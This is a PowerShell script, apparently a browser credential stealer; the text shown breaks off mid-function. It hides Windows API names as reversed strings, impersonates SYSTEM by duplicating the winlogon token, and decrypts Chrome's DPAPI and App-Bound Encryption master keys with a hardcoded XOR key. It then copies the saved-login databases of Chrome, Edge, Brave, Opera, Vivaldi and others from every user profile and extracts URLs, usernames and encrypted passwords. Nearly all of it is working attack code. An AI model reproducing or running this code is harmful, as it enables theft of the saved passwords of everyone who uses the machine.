try { Add-Type -AssemblyName System.Security } catch {}

function Invoke-FunctionLookup {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] [string] $moduleName,
        [Parameter(Position = 1, Mandatory = $true)] [string] $functionName
    )

    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $X1 }).GetType($X2)
    $PtrOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.IntPtr], [System.String]), $null)

    if ($PtrOverload) {
        $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
        return $PtrOverload.Invoke($null, @($moduleHandle, $functionName))
    }
    else {
        $handleRefOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.Runtime.InteropServices.HandleRef], [System.String]), $null)
        if (!$handleRefOverload) { throw "Could not find a suitable GetProcAddress overload on this system." }
        $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
        return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
    }
}

function Invoke-GetDelegate {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] [Type[]] $parameterTypes,
        [Parameter(Position = 1, Mandatory = $false)] [Type] $returnType = [Void]
    )

    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName($N1)),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule($N2, $false)
    $typeBuilder = $moduleBuilder.DefineType(
        $N3, 
        [System.Reflection.TypeAttributes]::Class -bor 
        [System.Reflection.TypeAttributes]::Public -bor 
        [System.Reflection.TypeAttributes]::Sealed -bor 
        [System.Reflection.TypeAttributes]::AnsiClass -bor 
        [System.Reflection.TypeAttributes]::AutoClass, 
        [System.MulticastDelegate]
    )
    $constructorBuilder = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::RTSpecialName -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::Public,
        [System.Reflection.CallingConventions]::Standard,
        $parameterTypes
    )
    $constructorBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )
    $methodBuilder = $typeBuilder.DefineMethod(
        'Invoke',
        [System.Reflection.MethodAttributes]::Public -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::NewSlot -bor 
        [System.Reflection.MethodAttributes]::Virtual,
        $returnType,
        $parameterTypes
    )
    $methodBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )
    return $typeBuilder.CreateType()
}

$X1 = ([regex]::Matches("lld.metsyS", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X2 = ([regex]::Matches("sdohteMevitaNefasnU.23niW.tfosorciM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X3 = ([regex]::Matches("sserddAcorPteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$X4 = ([regex]::Matches("eldnaHeludoMteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$N1 = ([regex]::Matches("etageleDdetcelfeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$N2 = ([regex]::Matches("eludoMyromeMnI", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
$N3 = ([regex]::Matches("epyTetageleDyM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

# ======================================================================
# Load Libraries
# ======================================================================
$LoadLibraryADelegate = Invoke-GetDelegate -ParameterTypes @([string]) -ReturnType ([IntPtr])
$LoadLibraryAFunctionPointer = Invoke-FunctionLookup -ModuleName "kernel32.dll" -FunctionName "LoadLibraryA"
$LoadLibraryA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAFunctionPointer, $LoadLibraryADelegate)

$LibraryHandle = $LoadLibraryA.Invoke("winsqlite3.dll")
if ($LibraryHandle -eq [IntPtr]::Zero) { Write-Output "[-] Failed to load winsqlite3.dll"; return }

# SQLite functions
$Sqlite3OpenV2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_open_v2'),
    (Invoke-GetDelegate @([string], [IntPtr].MakeByRefType(), [int], [IntPtr]) ([int])))
$Sqlite3Close = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_close'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))
$Sqlite3PrepareV2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_prepare_v2'),
    (Invoke-GetDelegate @([IntPtr], [string], [int], [IntPtr].MakeByRefType(), [IntPtr]) ([int])))
$Sqlite3Step = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_step'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))
$Sqlite3ColumnText = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_text'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([IntPtr])))
$Sqlite3ColumnBlob = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_blob'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([IntPtr])))
$Sqlite3ColumnByte = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_bytes'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([int])))
$Sqlite3Finalize = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_finalize'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))

# Token functions
$OpenProcessFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Kernel32.dll' -FunctionName 'OpenProcess'),
    (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])))
$OpenProcessTokenFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'OpenProcessToken'),
    (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([bool])))
$DuplicateTokenExFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'DuplicateTokenEx'),
    (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([bool])))
$ImpersonateLoggedOnUserFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'ImpersonateLoggedOnUser'),
    (Invoke-GetDelegate @([IntPtr]) ([bool])))
$CloseHandleFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'kernel32.dll' -FunctionName 'CloseHandle'),
    (Invoke-GetDelegate @([IntPtr]) ([bool])))

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
}
"@

# NCrypt functions
$LibraryHandle = $LoadLibraryA.Invoke("ncrypt.dll")
$NCryptOpenStorageProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenStorageProvider'),
    (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [int]) ([int])))
$NCryptOpenKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenKey'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [int]) ([int])))
$NCryptDecryptFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptDecrypt'),
    (Invoke-GetDelegate @([IntPtr], [byte[]], [int], [IntPtr], [byte[]], [int], [Int32].MakeByRefType(), [uint32]) ([int])))
$NCryptFreeObjectFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptFreeObject'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))

# BCrypt functions
$LibraryHandle = $LoadLibraryA.Invoke("bcrypt.dll")
$BCryptOpenAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptOpenAlgorithmProvider'),
    (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [IntPtr], [int]) ([int])))
$BCryptSetPropertyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptSetProperty'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [IntPtr], [int], [int]) ([int])))
$BCryptGenerateSymmetricKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptGenerateSymmetricKey'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [byte[]], [int], [int]) ([int])))
$BCryptDecryptFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDecrypt'),
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [int], [IntPtr], [IntPtr], [int], [IntPtr], [int], [Int32].MakeByRefType(), [int]) ([int])))
$BCryptDestroyKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDestroyKey'),
    (Invoke-GetDelegate @([IntPtr]) ([int])))
$BCryptCloseAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptCloseAlgorithmProvider'),
    (Invoke-GetDelegate @([IntPtr], [int]) ([int])))

# IElevator for Chrome 130+ handled via alternative method

# ======================================================================
# Helper Functions
# ======================================================================

function Invoke-Impersonate {
    $ProcessHandle = [IntPtr]::Zero
    $TokenHandle = [IntPtr]::Zero
    $DuplicateTokenHandle = [IntPtr]::Zero

    $CurrentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    if ($CurrentSid -eq 'S-1-5-18') { return $true }

    try {
        $WinlogonProcessId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
        $ProcessHandle = $OpenProcessFunction.Invoke(0x400, $true, [int]$WinlogonProcessId)
        if ($ProcessHandle -eq [IntPtr]::Zero) { return $false }

        $TokenHandle = [IntPtr]::Zero
        if (-not $OpenProcessTokenFunction.Invoke($ProcessHandle, 0x0E, [ref]$TokenHandle)) { return $false }

        $DuplicateTokenHandle = [IntPtr]::Zero
        if (-not $DuplicateTokenExFunction.Invoke($TokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$DuplicateTokenHandle)) {
            return $false
        }

        if (-not $ImpersonateLoggedOnUserFunction.Invoke($DuplicateTokenHandle)) { return $false }
        $NewSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        return ($NewSid -eq 'S-1-5-18')
    }
    catch { return $false }
    finally {
        if ($DuplicateTokenHandle -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($DuplicateTokenHandle) }
        if ($TokenHandle -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($TokenHandle) } 
        if ($ProcessHandle -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($ProcessHandle) }
    }
}

function HexToBytes {
    param([string]$HexString)
    $ByteArray = New-Object byte[] ($HexString.Length / 2)
    for ($i = 0; $i -lt $ByteArray.Length; $i++) {
        $ByteArray[$i] = [System.Convert]::ToByte($HexString.Substring($i * 2, 2), 16)
    }
    return $ByteArray
}

function XorBytes {
    param([byte[]]$a, [byte[]]$b)
    if ($a.Length -ne $b.Length) { throw "Length mismatch" }
    $result = New-Object byte[] $a.Length
    for ($i = 0; $i -lt $a.Length; $i++) { $result[$i] = $a[$i] -bxor $b[$i] }
    return $result
}

function DecryptWithAesGcm {
    param([byte[]]$Key, [byte[]]$Iv, [byte[]]$Ciphertext, [byte[]]$Tag)

    $AlgorithmHandle = [IntPtr]::Zero
    $KeyHandle = [IntPtr]::Zero

    try {
        $AlgPtr = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("AES")
        $Status = $BCryptOpenAlgorithmProviderFunction.Invoke([ref]$AlgorithmHandle, $AlgPtr, [IntPtr]::Zero, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($AlgPtr)
        if ($Status -ne 0) { throw "BCryptOpenAlgorithmProvider failed" }

        $PropName = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingMode")
        $PropVal = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingModeGCM")
        $Status = $BCryptSetPropertyFunction.Invoke($AlgorithmHandle, $PropName, $PropVal, 32, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropName)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropVal)
        if ($Status -ne 0) { throw "BCryptSetProperty failed" }

        $Status = $BCryptGenerateSymmetricKeyFunction.Invoke($AlgorithmHandle, [ref]$KeyHandle, [IntPtr]::Zero, 0, $Key, $Key.Length, 0)
        if ($Status -ne 0) { throw "BCryptGenerateSymmetricKey failed" }

        $CipherLen = $Ciphertext.Length
        $PlainLen = $CipherLen

        $IvPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($Iv.Length)
        $CipherPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($CipherLen)
        $TagPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($Tag.Length)
        $PlainPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($PlainLen)

        [Runtime.InteropServices.Marshal]::Copy($Iv, 0, $IvPtr, $Iv.Length)
        [Runtime.InteropServices.Marshal]::Copy($Ciphertext, 0, $CipherPtr, $CipherLen)
        [Runtime.InteropServices.Marshal]::Copy($Tag, 0, $TagPtr, $Tag.Length)

        $AuthInfoSize = 96
        $AuthInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($AuthInfoSize)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 0, $AuthInfoSize)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 4, 1)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 8, $IvPtr.ToInt64())
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 16, $Iv.Length)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 24, 0)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 32, 0)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 40, $TagPtr.ToInt64())
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 48, $Tag.Length)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 56, 0)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 64, 0)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 68, 0)
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 72, 0)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 80, 0)

        [int]$ResultLen = 0
        $Status = $BCryptDecryptFunction.Invoke($KeyHandle, $CipherPtr, $CipherLen, $AuthInfoPtr, [IntPtr]::Zero, 0, $PlainPtr, $PlainLen, [ref]$ResultLen, 0)
        if ($Status -ne 0) { throw "BCryptDecrypt failed" }

        $PlainBytes = New-Object byte[] $ResultLen
        [Runtime.InteropServices.Marshal]::Copy($PlainPtr, $PlainBytes, 0, $ResultLen)
        return $PlainBytes
    }
    finally {
        if ($AuthInfoPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($AuthInfoPtr) }
        if ($PlainPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($PlainPtr) }
        if ($CipherPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($CipherPtr) }
        if ($TagPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($TagPtr) }
        if ($IvPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($IvPtr) }
        if ($KeyHandle -ne [IntPtr]::Zero) { [void]$BCryptDestroyKeyFunction.Invoke($KeyHandle) }
        if ($AlgorithmHandle -ne [IntPtr]::Zero) { [void]$BCryptCloseAlgorithmProviderFunction.Invoke($AlgorithmHandle, 0) }
    }
}

function DecryptWithNCrypt {
    param([byte[]]$InputData)
    try {
        $ProviderName = "Microsoft Software Key Storage Provider"
        $KeyName = "Google Chromekey1"
        $ProviderHandle = [IntPtr]::Zero
        $KeyHandle = [IntPtr]::Zero

        $ProvPtr = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
        $Status = $NCryptOpenStorageProviderFunction.Invoke([ref]$ProviderHandle, $ProvPtr, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($ProvPtr)
        if ($Status -ne 0) { return $null }

        $KeyPtr = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($KeyName)
        $Status = $NCryptOpenKeyFunction.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyPtr, 0, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($KeyPtr)
        if ($Status -ne 0) { return $null }

        $OutputSize = 0
        $Status = $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $null, 0, [ref]$OutputSize, 0x40)
        if ($Status -ne 0) { return $null }

        $OutputBytes = New-Object byte[] $OutputSize
        $Status = $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $OutputBytes, $OutputBytes.Length, [ref]$OutputSize, 0x40)
        if ($Status -ne 0) { return $null }

        return $OutputBytes
    }
    finally {
        if ($KeyHandle -ne [IntPtr]::Zero) { [void]$NCryptFreeObjectFunction.Invoke($KeyHandle) }
        if ($ProviderHandle -ne [IntPtr]::Zero) { [void]$NCryptFreeObjectFunction.Invoke($ProviderHandle) }
    }
}

# ======================================================================
# Parse Chrome Key Blob - Supports ALL flags (1, 2, 3, 33)
# ======================================================================
function Parse-ChromeKeyBlob {
    param([byte[]]$BlobData)

    $Offset = 0
    $HeaderLen = [BitConverter]::ToInt32($BlobData, $Offset); $Offset += 4
    $HeaderBytes = $BlobData[$Offset..($Offset + $HeaderLen - 1)]; $Offset += $HeaderLen
    $ContentLen = [BitConverter]::ToInt32($BlobData, $Offset); $Offset += 4
    $Flag = $BlobData[$Offset]; $Offset += 1

    $Result = @{
        Header = $HeaderBytes
        Flag = $Flag
        Iv = $null
        Ciphertext = $null
        Tag = $null
        EncryptedAesKey = $null
        RawContent = $null
    }

    # Flag 1 or 2: [flag|iv(12)|ciphertext(32)|tag(16)]
    if ($Flag -eq 1 -or $Flag -eq 2) {
        $Result.Iv = $BlobData[$Offset..($Offset + 11)]; $Offset += 12
        $Result.Ciphertext = $BlobData[$Offset..($Offset + 31)]; $Offset += 32
        $Result.Tag = $BlobData[$Offset..($Offset + 15)]
    }
    # Flag 3: [flag|encrypted_aes_key(32)|iv(12)|ciphertext(32)|tag(16)]
    elseif ($Flag -eq 3) {
        $Result.EncryptedAesKey = $BlobData[$Offset..($Offset + 31)]; $Offset += 32
        $Result.Iv = $BlobData[$Offset..($Offset + 11)]; $Offset += 12
        $Result.Ciphertext = $BlobData[$Offset..($Offset + 31)]; $Offset += 32
        $Result.Tag = $BlobData[$Offset..($Offset + 15)]
    }
    # Flag 33 (0x21): Chrome 130+ new format - content after flag is encrypted blob for IElevator
    elseif ($Flag -eq 33) {
        $RemainingLen = $ContentLen - 1
        $Result.RawContent = $BlobData[$Offset..($Offset + $RemainingLen - 1)]
    }
    else {
        throw "Unknown flag: $Flag"
    }

    return New-Object PSObject -Property $Result
}

# ======================================================================
# Decrypt Master Key - Supports ALL Chrome versions
# ======================================================================
function Decrypt-MasterKey {
    param(
        [string]$LocalStatePath,
        [string]$Browser
    )

    if (-not (Test-Path $LocalStatePath)) { return $null }

    try {
        $LocalState = Get-Content $LocalStatePath -Raw -ErrorAction Stop | ConvertFrom-Json
    }
    catch { return $null }

    # Try v10 key first (DPAPI user)
    if ($LocalState.os_crypt.encrypted_key) {
        try {
            $EncKey = [Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
            # Remove "DPAPI" prefix (5 bytes)
            if ([Text.Encoding]::ASCII.GetString($EncKey[0..4]) -eq "DPAPI") {
                $EncKey = $EncKey[5..($EncKey.Length - 1)]
                $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                return @{ Key = $MasterKey; Type = "v10" }
            }
        }
        catch {}
    }

    # Try v20 ABE key (App-Bound Encryption)
    if ($LocalState.os_crypt.app_bound_encrypted_key) {
        try {
            $AppBoundEnc = [Convert]::FromBase64String($LocalState.os_crypt.app_bound_encrypted_key)
            
            if ([Text.Encoding]::ASCII.GetString($AppBoundEnc[0..3]) -ne "APPB") {
                return $null
            }

            $EncKeyBlob = $AppBoundEnc[4..($AppBoundEnc.Length - 1)]
            
            # First DPAPI unprotect as SYSTEM
            $WasImpersonated = Invoke-Impersonate
            
            try {
                $First = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKeyBlob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            }
            catch {
                if ($WasImpersonated) { [Advapi32]::RevertToSelf() | Out-Null }
                return $null
            }

            if ($WasImpersonated) { [Advapi32]::RevertToSelf() | Out-Null }

            # Second DPAPI unprotect as user
            $Second = [System.Security.Cryptography.ProtectedData]::Unprotect($First, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            
            $Parsed = Parse-ChromeKeyBlob -BlobData $Second

            # Flag 3: Standard ABE
            if ($Parsed.Flag -eq 3) {
                [byte[]]$XorKey = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
                
                Invoke-Impersonate | Out-Null
                try {
                    $DecryptedAesKey = DecryptWithNCrypt -InputData $Parsed.EncryptedAesKey
                    if (-not $DecryptedAesKey) { throw "NCrypt failed" }
                    
                    $XoredKey = XorBytes -a $DecryptedAesKey -b $XorKey
                    $MasterKey = DecryptWithAesGcm -Key $XoredKey -Iv $Parsed.Iv -Ciphertext $Parsed.Ciphertext -Tag $Parsed.Tag
                    return @{ Key = $MasterKey; Type = "v20-flag3" }
                }
                finally {
                    [Advapi32]::RevertToSelf() | Out-Null
                }
            }
            # Flag 33: Chrome 130+ - requires external decryptor
            elseif ($Parsed.Flag -eq 33) {
                Write-Host "    [!] Flag 33 detected (Chrome 130+). Use chrome-app-bound-encryption-decryption tool." -ForegroundColor Yellow
                return $null
            }
            # Flag 1 or 2
            elseif ($Parsed.Flag -eq 1 -or $Parsed.Flag -eq 2) {
                # These require different decryption - usually just DPAPI
                return @{ Key = $Second; Type = "v20-flag$($Parsed.Flag)" }
            }
        }
        catch {
            return $null
        }
    }

    return $null
}

# ======================================================================
# Get All Browser Login Blobs
# ======================================================================
function Get-AllBrowserLoginBlobs {
    param([switch]$Verbose)

    $BrowserPaths = @{
        "Chrome"   = "Google\Chrome\User Data"
        "Edge"     = "Microsoft\Edge\User Data"
        "Brave"    = "BraveSoftware\Brave-Browser\User Data"
        "Chromium" = "Chromium\User Data"
        "Opera"    = "Opera Software\Opera Stable"
        "OperaGX"  = "Opera Software\Opera GX Stable"
        "Vivaldi"  = "Vivaldi\User Data"
    }

    $AllResults = @()
    $UsersPath = "C:\Users"
    $UserDirs = Get-ChildItem -Path $UsersPath -Directory -ErrorAction SilentlyContinue | 
                Where-Object { $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') }

    foreach ($UserDir in $UserDirs) {
        $Username = $UserDir.Name
        $LocalAppData = Join-Path $UserDir.FullName "AppData\Local"
        if (-not (Test-Path $LocalAppData)) { continue }

        foreach ($Browser in $BrowserPaths.Keys) {
            $BrowserPath = Join-Path $LocalAppData $BrowserPaths[$Browser]
            if (-not (Test-Path $BrowserPath)) { continue }

            # Find all profiles
            $Profiles = @()
            $DefaultProfile = Join-Path $BrowserPath "Default"
            if (Test-Path $DefaultProfile) { $Profiles += "Default" }
            
            Get-ChildItem -Path $BrowserPath -Directory -ErrorAction SilentlyContinue | 
                Where-Object { $_.Name -match "^Profile \d+$" } | 
                ForEach-Object { $Profiles += $_.Name }

            foreach ($Profile in $Profiles) {
                $ProfilePath = Join-Path $BrowserPath $Profile
                $LoginDataPath = Join-Path $ProfilePath "Login Data"
                $LocalStatePath = Join-Path $BrowserPath "Local State"

                if (-not (Test-Path $LoginDataPath)) { continue }

                if ($Verbose) {
                    Write-Host "[*] Found: $Username -> $Browser -> $Profile" -ForegroundColor Cyan
                }

                $Blobs = Get-LoginBlobsFromPath -LoginDataPath $LoginDataPath -Browser $Browser -Username $Username -Profile $Profile -LocalStatePath $LocalStatePath
                if ($Blobs) { $AllResults += $Blobs }
            }
        }
    }

    return $AllResults
}

function Get-LoginBlobsFromPath {
    param([string]$LoginDataPath, [string]$Browser, [string]$Username, [string]$Profile, [string]$LocalStatePath)

    $TempDb = Join-Path $env:TEMP "$([guid]::NewGuid()).db"
    try { Copy-Item -LiteralPath $LoginDataPath -Destination $TempDb -Force -ErrorAction Stop }
    catch { return $null }

    $DbPtr = [IntPtr]::Zero
    $StmtPtr = [IntPtr]::Zero
    $Query = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'

    if ($Sqlite3OpenV2.Invoke($TempDb, [ref]$DbPtr, 1, [IntPtr]::Zero) -ne 0) {
        Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
        return $null
    }

    if ($Sqlite3PrepareV2.Invoke($DbPtr, $Query, -1, [ref]$StmtPtr, [IntPtr]::Zero) -ne 0) {
        $Sqlite3Close.Invoke($DbPtr) | Out-Null
        Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
        return $null
    }

    $Results = @()
    while ($Sqlite3Step.Invoke($StmtPtr) -eq 100) {
        $ActionPtr = $Sqlite3ColumnText.Invoke($StmtPtr, 0)
        $OriginPtr = $Sqlite3ColumnText.Invoke($StmtPtr, 1)
        $UserPtr = $Sqlite3ColumnText.Invoke($StmtPtr, 2)
        $PassPtr = $Sqlite3ColumnBlob.Invoke($StmtPtr, 3)
        $PassSize = $Sqlite3ColumnByte.Invoke($StmtPtr, 3)

        $ActionUrl = if ($ActionPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ActionPtr) } else { "" }
        $OriginUrl = if ($OriginPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($OriginPtr) } else { "" }
        $LoginUser = if ($UserPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UserPtr) } else { "" }
        $Url = if ($ActionUrl) { $ActionUrl } else { $OriginUrl }
        if (-not $Url) { continue }

        $RawPass = @()
        if ($PassSize -gt 0 -and $PassPtr -ne [IntPtr]::Zero) {
            $RawPass = New-Object byte[] $PassSize
            [Runtime.InteropServices.Marshal]::Copy($PassPtr, $RawPass, 0, $PassSize)
        }
        if ($RawPass.Length -eq 0) { continue }

        $Header3 = [Text.Encoding]::ASCII.GetString($RawPass, 0, [Math]::Min(3, $RawPass.Length))
        $Header5 = [Text.Encoding]::ASCII.GetString($RawPass, 0, [Math]::Min(5, $RawPass.Length))

        $BlobType = if ($Header5 -eq "DPAPI") { "DPAPI" }
                    elseif ($Header3 -eq "v10") { "v10" }
                    elseif ($Header3 -eq "v20") { "v20" }
                    else { "Unknown" }

        $Results += [PSCustomObject]@{
            WindowsUser = $Username
            Browser = $Browser
            Profile = $Profile
            URL = $Url
            Username = $LoginUser
            BlobType = $BlobType
            LocalStatePath = $LocalStatePath
            EncryptedPassword = [Convert]::ToBase64String($RawPass)
        }
    }

    [void]$Sqlite3Finalize.Invoke($StmtPtr)
